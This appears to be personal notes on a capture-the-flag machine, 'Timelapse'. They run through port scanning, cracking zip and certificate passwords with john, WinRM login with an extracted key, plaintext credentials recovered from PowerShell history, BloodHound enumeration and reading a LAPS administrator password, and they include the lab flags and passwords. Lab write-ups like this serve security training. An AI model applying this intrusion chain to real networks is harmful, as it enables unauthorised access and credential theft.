# Enumeration
## Nmap
```bash
sudo nmap -sC -sV -oA nmap/timelapse 10.10.11.152
```

smb

zipfile

```
john hash.txt --wordlist=/usr/share/Seclists/password/rockyou.txt

supremelegacy
```

pfx file which has a pwd so convert that with john.
```
thuglegacy
```


```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes

openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out key.crt
```

Log in with evil-winrm
```
evil-winrm -S -i 10.10.11.152 -c key.crt -k key.pem
```

# Shell as legacyy
user.txt
```
d8af07eedb721982d81dee7cb4261efb
```

check useful files:
```
C:\Users\legacyy\APPDATA\roaming\microsoft\windows\powershell\psreadline
```

lmao free creds.
```
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

bloodhound time.
```
python3 bloodhound.py -c all -dc dc01.timelapse.htb -d timelapse.htb -u svc_deploy@timelapse.htb -ns 10.10.11.152 --zip
```

laps member

```
Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *
K2W;H92BOl;j2{BO/j!38MxL
```

root.txt
```
ff7b347b27d7a1de65513953c8c74791
```